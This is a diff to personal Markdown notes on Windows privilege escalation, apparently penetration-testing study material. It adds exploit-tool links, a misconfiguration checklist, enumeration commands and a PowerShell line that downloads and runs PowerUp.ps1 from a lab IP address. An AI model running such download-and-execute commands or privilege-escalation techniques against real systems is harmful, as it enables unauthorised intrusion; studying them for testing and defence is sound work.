@@ -9,6 +9,9 @@
 - [GhostPacks](https://github.com/GhostPack)
 - [GhostPacks-compiled](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
 - [Wadcom](https://wadcoms.github.io/) Cheat sheet for windows offensive tools
+- sherlock.ps1
+- [windows exploit suggestor](https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2)
+- 
 ```
 - use enumeration tools
 - remember to use **netcat** for reverse shells!
@@ -28,14 +31,20 @@
 - Weak Registry permissions
 - writable StartUp Folders
 - Windows AutoLogon credentails
+- Unquoted Service Paths
+- Insecure Permissions on Service Executable
+- Insecure Service Permissions
+- Unpatched Software
+- Weak Registry permissions
+- writable StartUp Folders
 ```
 
 - exploiting privileges [show me your privs, and I will lead you to system](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf)
 - kernel exploits: https://github.com/ASR511-OO7/windows-kernel-exploits
 - offsec exploits db: https://github.com/offensive-security/exploitdb-bin-sploits
 - AD cheatsheet : https://wadcoms.github.io/
-- sweet potato rule all [potato exploits](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) 
-
+- sweet potato rule all [potato exploits](https://jlajara.gitlab.io/Potatoes_Windows_Privesc), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases)
+	
 - Windows DLLs search order
 ```
 1. The directory from which the application loaded.
@@ -74,7 +83,8 @@ Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 # show scheduleds
 Get-ScheduledTask
-schtasks /query
+schtasks /query /fo LIST /v
+
 ```
 
 - mimikatz
@@ -169,6 +179,8 @@ Invoke-WebRequest -URI $URL -OutFile $Path
 #
 (New-Object System.Net.WebClient).DownloadFile($URL, $Path)
 (New-Object System.Net.WebClient).DownloadString($URL)
+IEX(New-Object Net.Webclient).DownloadString('http://192.168.45.199/PowerUp.ps1');Invoke-AllChecks
+
 #
 Start-BitsTransfer -Source $URL -Destination $Path
 # 
@@ -187,21 +199,14 @@ Invoke-Command -FilePath "C:\temp\shell.ps1" -Credential $cred -Computer localho
 
 ```
 
-- check list
-```
-Unquoted Service Paths
-Insecure Permissions on Service Executable
-Insecure Service Permissions
-Unpatched Software
-Weak Registry permissions
-writable StartUp Folders
 
-```
 - Windows Privileges:
 ```
+By default, Windows assigns this privilege to members of the local Administrators group as well as the device's LOCAL SERVICE, NETWORK SERVICE, and SERVICE accounts
+
+
+SeImpersonatePrivilege, SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver
 SeBackup / SeRestore
-SeTakeOwnership
-SeImpersonate / SeAssignPrimaryToken 
 
 ```
 - tools
